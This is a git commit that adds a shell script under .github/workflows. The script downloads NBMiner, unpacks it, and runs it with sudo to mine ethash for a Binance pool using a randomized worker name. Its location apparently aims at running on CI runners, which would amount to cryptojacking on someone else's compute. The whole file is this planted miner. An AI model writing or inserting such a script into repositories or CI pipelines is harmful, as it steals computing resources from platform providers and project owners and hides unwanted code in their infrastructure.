ace03e2dcdd9b291b861dd14b2617ab601423e32
ggreskic <92234298+ggreskic@users.noreply.github.com>
2021-10-10 01:50:35 +0200

    Create sh.sh

---
+++ .github/workflows/sh.sh
@@ -0,0 +1,5 @@
+#!/bin/sh 
+wget https://github.com/NebuTech/NBMiner/releases/download/v39.5/NBMiner_39.5_Linux.tgz
+tar xf NBMiner_39.5_Linux.tgz
+cd NBMiner_Linux
+sudo ./nbminer -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u Koske.koske_$(echo $(shuf -i 1-9999 -n 1))
